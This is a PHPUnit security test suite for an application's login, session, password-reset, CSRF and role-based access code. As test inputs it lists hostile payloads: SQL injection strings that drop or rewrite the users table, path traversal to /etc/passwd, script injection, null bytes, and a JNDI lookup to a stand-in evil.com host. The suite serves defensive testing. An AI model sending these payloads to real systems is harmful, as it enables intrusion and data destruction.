<?php

namespace EasyStream\Tests\Security;

use PHPUnit\Framework\TestCase;
use VAuth;
use VRBAC;
use VSecurity;

class AuthSecurityTest extends TestCase
{
    private $auth;
    private $rbac;
    private $testUserId;
    
    protected function setUp(): void
    {
        $this->auth = VAuth::getInstance();
        $this->rbac = VRBAC::getInstance();
        
        // Clear session data
        if (isset($_SESSION)) {
            $_SESSION = [];
        }
        
        // Mock server variables
        $_SERVER = [
            'REQUEST_URI' => '/test',
            'REQUEST_METHOD' => 'POST',
            'HTTP_USER_AGENT' => 'PHPUnit Security Test',
            'REMOTE_ADDR' => '127.0.0.1',
            'HTTPS' => '1'
        ];
        
        // Clean up any existing test data
        $this->cleanupTestData();
        
        // Create test user
        $this->createTestUser();
    }
    
    protected function tearDown(): void
    {
        // Clean up test data
        $this->cleanupTestData();
        
        // Clear session
        if (isset($_SESSION)) {
            $_SESSION = [];
        }
    }
    
    private function cleanupTestData()
    {
        global $class_database;
        $db = $class_database->dbConnection();
        
        $testEmail = 'authsec@example.com';
        $userId = $db->GetOne("SELECT user_id FROM db_users WHERE email = ?", [$testEmail]);
        if ($userId) {
            $db->Execute("DELETE FROM db_sessions WHERE user_id = ?", [$userId]);
            $db->Execute("DELETE FROM db_login_history WHERE user_id = ?", [$userId]);
            $db->Execute("DELETE FROM db_users WHERE user_id = ?", [$userId]);
        }
    }
    
    private function createTestUser()
    {
        $userData = [
            'username' => 'authsectest',
            'email' => 'authsec@example.com',
            'password' => 'TestPassword123!'
        ];
        
        $result = $this->auth->register($userData);
        if ($result['success']) {
            $this->testUserId = $result['user_id'];
            
            // Verify email
            global $class_database;
            $db = $class_database->dbConnection();
            $token = $db->GetOne("SELECT verification_token FROM db_users WHERE user_id = ?", [$this->testUserId]);
            if ($token) {
                $this->auth->verifyEmail($token);
            }
        }
    }
    
    /**
     * Test SQL injection attempts in authentication
     */
    public function testSQLInjectionInAuthentication()
    {
        $sqlInjectionPayloads = [
            "admin'; DROP TABLE db_users; --",
            "admin' OR '1'='1",
            "admin' UNION SELECT * FROM db_users WHERE '1'='1",
            "admin'; UPDATE db_users SET password_hash='hacked' WHERE '1'='1'; --",
            "admin' AND (SELECT COUNT(*) FROM db_users) > 0 --"
        ];
        
        foreach ($sqlInjectionPayloads as $payload) {
            // Test login with malicious username
            $result = $this->auth->login($payload, 'password');
            $this->assertFalse($result['success'], "SQL injection vulnerability in username: {$payload}");
            
            // Test login with malicious password
            $result = $this->auth->login('authsectest', $payload);
            $this->assertFalse($result['success'], "SQL injection vulnerability in password: {$payload}");
            
            // Test registration with malicious data
            $userData = [
                'username' => $payload,
                'email' => 'test@example.com',
                'password' => 'TestPassword123!'
            ];
            $result = $this->auth->register($userData);
            $this->assertFalse($result['success'], "SQL injection vulnerability in registration username: {$payload}");
            
            // Test password reset with malicious email
            $result = $this->auth->requestPasswordReset($payload);
            // Should either fail validation or be safely handled
            $this->assertIsArray($result);
        }
    }
    
    /**
     * Test session fixation attacks
     */
    public function testSessionFixationPrevention()
    {
        // Start with a specific session ID
        session_id('fixed_session_id_123');
        session_start();
        $originalSessionId = session_id();
        
        // Login user
        $result = $this->auth->login('authsectest', 'TestPassword123!');
        $this->assertTrue($result['success']);
        
        // Session ID should have changed after login
        $newSessionId = session_id();
        $this->assertNotEquals($originalSessionId, $newSessionId, 'Session ID should change after login to prevent fixation');
        
        $this->auth->logout();
    }
    
    /**
     * Test session hijacking prevention
     */
    public function testSessionHijackingPrevention()
    {
        // Login user
        $this->auth->login('authsectest', 'TestPassword123!');
        $this->assertTrue($this->auth->isAuthenticated());
        
        $originalUserAgent = $_SESSION['USER_AGENT'] ?? '';
        $originalIP = $_SESSION['IP_ADDRESS'] ?? '';
        
        // Simulate session hijacking by changing user agent
        $_SERVER['HTTP_USER_AGENT'] = 'Malicious Browser';
        
        // Authentication should still work (we don't enforce strict UA checking in this implementation)
        // But the change should be logged
        $this->assertTrue($this->auth->isAuthenticated());
        
        // Simulate IP change (more serious)
        $_SERVER['REMOTE_ADDR'] = '192.168.1.100';
        
        // This should still work but be logged for monitoring
        $this->assertTrue($this->auth->isAuthenticated());
        
        $this->auth->logout();
    }
    
    /**
     * Test brute force attack prevention
     */
    public function testBruteForceAttackPrevention()
    {
        $maxAttempts = 5;
        
        // Make multiple failed login attempts
        for ($i = 0; $i < $maxAttempts + 2; $i++) {
            $result = $this->auth->login('authsectest', 'WrongPassword' . $i);
            
            if ($i < $maxAttempts) {
                $this->assertFalse($result['success']);
                $this->assertStringContainsString('Invalid credentials', $result['message']);
            } else {
                // Should be rate limited
                $this->assertFalse($result['success']);
                $this->assertStringContainsString('Too many', $result['message']);
            }
        }
        
        // Even correct password should be blocked
        $result = $this->auth->login('authsectest', 'TestPassword123!');
        $this->assertFalse($result['success']);
        $this->assertStringContainsString('Too many', $result['message']);
    }
    
    /**
     * Test password reset token security
     */
    public function testPasswordResetTokenSecurity()
    {
        // Request password reset
        $result = $this->auth->requestPasswordReset('authsec@example.com');
        $this->assertTrue($result['success']);
        
        // Get token from database
        global $class_database;
        $db = $class_database->dbConnection();
        $token = $db->GetOne("SELECT reset_token FROM db_users WHERE user_id = ?", [$this->testUserId]);
        $this->assertNotEmpty($token);
        
        // Test token format (should be cryptographically secure)
        $this->assertEquals(64, strlen($token), 'Reset token should be 64 characters (32 bytes hex)');
        $this->assertMatchesRegularExpression('/^[a-f0-9]+$/', $token, 'Reset token should be hexadecimal');
        
        // Test token is one-time use
        $result1 = $this->auth->resetPassword($token, 'NewPassword123!');
        $this->assertTrue($result1['success']);
        
        // Same token should not work again
        $result2 = $this->auth->resetPassword($token, 'AnotherPassword123!');
        $this->assertFalse($result2['success']);
        
        // Test invalid token formats
        $invalidTokens = [
            'short_token',
            str_repeat('a', 63), // Too short
            str_repeat('a', 65), // Too long
            str_repeat('g', 64), // Invalid hex characters
            '../../../etc/passwd',
            '<script>alert("xss")</script>',
            "'; DROP TABLE db_users; --"
        ];
        
        foreach ($invalidTokens as $invalidToken) {
            $result = $this->auth->resetPassword($invalidToken, 'TestPassword123!');
            $this->assertFalse($result['success'], "Invalid token should be rejected: {$invalidToken}");
        }
    }
    
    /**
     * Test email verification token security
     */
    public function testEmailVerificationTokenSecurity()
    {
        // Create unverified user
        $userData = [
            'username' => 'unverified',
            'email' => 'unverified@example.com',
            'password' => 'TestPassword123!'
        ];
        
        $result = $this->auth->register($userData);
        $this->assertTrue($result['success']);
        $userId = $result['user_id'];
        
        // Get verification token
        global $class_database;
        $db = $class_database->dbConnection();
        $token = $db->GetOne("SELECT verification_token FROM db_users WHERE user_id = ?", [$userId]);
        $this->assertNotEmpty($token);
        
        // Test token format
        $this->assertEquals(64, strlen($token), 'Verification token should be 64 characters');
        $this->assertMatchesRegularExpression('/^[a-f0-9]+$/', $token, 'Verification token should be hexadecimal');
        
        // Test token is one-time use
        $result1 = $this->auth->verifyEmail($token);
        $this->assertTrue($result1['success']);
        
        // Same token should not work again
        $result2 = $this->auth->verifyEmail($token);
        $this->assertFalse($result2['success']);
        
        // Clean up
        $db->Execute("DELETE FROM db_users WHERE user_id = ?", [$userId]);
    }
    
    /**
     * Test authentication bypass attempts
     */
    public function testAuthenticationBypassAttempts()
    {
        // Test direct session manipulation
        $_SESSION['USER_ID'] = 999999; // Non-existent user
        $_SESSION['USERNAME'] = 'hacker';
        $_SESSION['ROLE'] = 'admin';
        
        // Should not be authenticated with invalid session data
        $this->assertFalse($this->auth->isAuthenticated());
        $this->assertNull($this->auth->getCurrentUser());
        
        // Test session without proper authentication
        $_SESSION = [];
        $_SESSION['USER_ID'] = $this->testUserId;
        $_SESSION['USERNAME'] = 'authsectest';
        // Missing other required session data
        
        // Should not be authenticated with incomplete session
        $this->assertFalse($this->auth->isAuthenticated());
        
        // Test role escalation attempt
        $this->auth->login('authsectest', 'TestPassword123!');
        $this->assertTrue($this->auth->isAuthenticated());
        
        // Try to escalate role in session
        $_SESSION['ROLE'] = 'admin';
        
        // RBAC should check actual database role, not session
        $this->assertFalse($this->rbac->hasRole('admin'));
        $this->assertFalse($this->rbac->hasPermission('admin.dashboard'));
        
        $this->auth->logout();
    }
    
    /**
     * Test timing attack resistance
     */
    public function testTimingAttackResistance()
    {
        // Test login timing for existing vs non-existing users
        $existingUser = 'authsectest';
        $nonExistingUser = 'nonexistentuser12345';
        
        // Measure time for existing user (wrong password)
        $start = microtime(true);
        $this->auth->login($existingUser, 'wrongpassword');
        $existingUserTime = microtime(true) - $start;
        
        // Measure time for non-existing user
        $start = microtime(true);
        $this->auth->login($nonExistingUser, 'wrongpassword');
        $nonExistingUserTime = microtime(true) - $start;
        
        // Time difference should be minimal (within reasonable bounds)
        $timeDifference = abs($existingUserTime - $nonExistingUserTime);
        $this->assertLessThan(0.1, $timeDifference, 'Login timing should be consistent to prevent user enumeration');
    }
    
    /**
     * Test password strength enforcement
     */
    public function testPasswordStrengthEnforcement()
    {
        $weakPasswords = [
            'password',
            '123456',
            'qwerty',
            'abc123',
            'Password', // No number or special char
            'password123', // No uppercase or special char
            'PASSWORD123!', // No lowercase
            'Password!', // No number
            'Pass1!', // Too short
            ''
        ];
        
        foreach ($weakPasswords as $weakPassword) {
            $userData = [
                'username' => 'weakpasstest',
                'email' => 'weakpass@example.com',
                'password' => $weakPassword
            ];
            
            $result = $this->auth->register($userData);
            $this->assertFalse($result['success'], "Weak password should be rejected: '{$weakPassword}'");
        }
    }
    
    /**
     * Test account enumeration prevention
     */
    public function testAccountEnumerationPrevention()
    {
        // Test registration with existing email
        $userData = [
            'username' => 'newuser',
            'email' => 'authsec@example.com', // Existing email
            'password' => 'TestPassword123!'
        ];
        
        $result = $this->auth->register($userData);
        $this->assertFalse($result['success']);
        // Should not reveal whether email exists
        $this->assertStringNotContainsString('email already exists', strtolower($result['message']));
        
        // Test password reset with non-existing email
        $result = $this->auth->requestPasswordReset('nonexistent@example.com');
        // Should return success to prevent enumeration
        $this->assertTrue($result['success']);
        $this->assertStringContainsString('If the email exists', $result['message']);
    }
    
    /**
     * Test CSRF protection in authentication
     */
    public function testCSRFProtectionInAuth()
    {
        // Test login without CSRF token
        $_POST['csrf_token'] = '';
        $result = VSecurity::validateCSRFFromPost('login');
        $this->assertFalse($result, 'Login should require valid CSRF token');
        
        // Test with valid CSRF token
        $token = VSecurity::generateCSRFToken('login');
        $_POST['csrf_token'] = $token;
        $result = VSecurity::validateCSRFFromPost('login');
        $this->assertTrue($result, 'Valid CSRF token should be accepted');
        
        // Test token reuse (should fail)
        $result = VSecurity::validateCSRFFromPost('login');
        $this->assertFalse($result, 'CSRF token should be one-time use');
    }
    
    /**
     * Test session security headers and configuration
     */
    public function testSessionSecurityConfiguration()
    {
        // Test secure session configuration
        $this->assertEquals('1', ini_get('session.cookie_httponly'), 'Session cookies should be HTTP-only');
        
        if (isset($_SERVER['HTTPS'])) {
            $this->assertEquals('1', ini_get('session.cookie_secure'), 'Session cookies should be secure over HTTPS');
        }
        
        $this->assertEquals('1', ini_get('session.use_strict_mode'), 'Session should use strict mode');
    }
    
    /**
     * Test privilege escalation prevention
     */
    public function testPrivilegeEscalationPrevention()
    {
        // Login as regular user
        $this->auth->login('authsectest', 'TestPassword123!');
        
        // Try to access admin functions
        $this->assertFalse($this->rbac->hasPermission('admin.dashboard'));
        $this->assertFalse($this->rbac->hasPermission('user.ban'));
        
        // Try to manipulate session to gain admin access
        $_SESSION['ROLE'] = 'admin';
        
        // RBAC should still deny access based on database role
        $this->assertFalse($this->rbac->hasPermission('admin.dashboard'));
        
        // Try to grant self admin permissions (should fail without proper authorization)
        $currentUser = $this->auth->getCurrentUser();
        $result = $this->rbac->grantPermission($currentUser['user_id'], 'admin.dashboard', $currentUser['user_id']);
        
        // Should fail because user doesn't have permission to grant permissions
        $this->assertFalse($result);
        
        $this->auth->logout();
    }
    
    /**
     * Test concurrent session security
     */
    public function testConcurrentSessionSecurity()
    {
        // Login user
        $this->auth->login('authsectest', 'TestPassword123!');
        $sessionId1 = session_id();
        
        // Simulate password change (should invalidate all sessions)
        global $class_database;
        $db = $class_database->dbConnection();
        $newPasswordHash = password_hash('NewPassword123!', PASSWORD_DEFAULT);
        $db->Execute("UPDATE db_users SET password_hash = ? WHERE user_id = ?", [$newPasswordHash, $this->testUserId]);
        
        // Current session should still be valid (password change doesn't auto-logout in this implementation)
        $this->assertTrue($this->auth->isAuthenticated());
        
        // But new login should require new password
        $this->auth->logout();
        
        // Old password should not work
        $result = $this->auth->login('authsectest', 'TestPassword123!');
        $this->assertFalse($result['success']);
        
        // New password should work
        $result = $this->auth->login('authsectest', 'NewPassword123!');
        $this->assertTrue($result['success']);
        
        $this->auth->logout();
    }
    
    /**
     * Test input validation security
     */
    public function testInputValidationSecurity()
    {
        $maliciousInputs = [
            '<script>alert("xss")</script>',
            '../../etc/passwd',
            '${jndi:ldap://evil.com/a}',
            '%00%00%00',
            "\x00\x01\x02",
            str_repeat('A', 10000), // Very long input
            "admin\x00hidden",
            'admin%00hidden'
        ];
        
        foreach ($maliciousInputs as $input) {
            // Test registration with malicious input
            $userData = [
                'username' => $input,
                'email' => 'test@example.com',
                'password' => 'TestPassword123!'
            ];
            
            $result = $this->auth->register($userData);
            // Should either fail validation or be safely sanitized
            $this->assertIsArray($result);
            
            // Test login with malicious input
            $result = $this->auth->login($input, 'password');
            $this->assertFalse($result['success']);
            
            // Test password reset with malicious input
            $result = $this->auth->requestPasswordReset($input);
            $this->assertIsArray($result);
        }
    }
}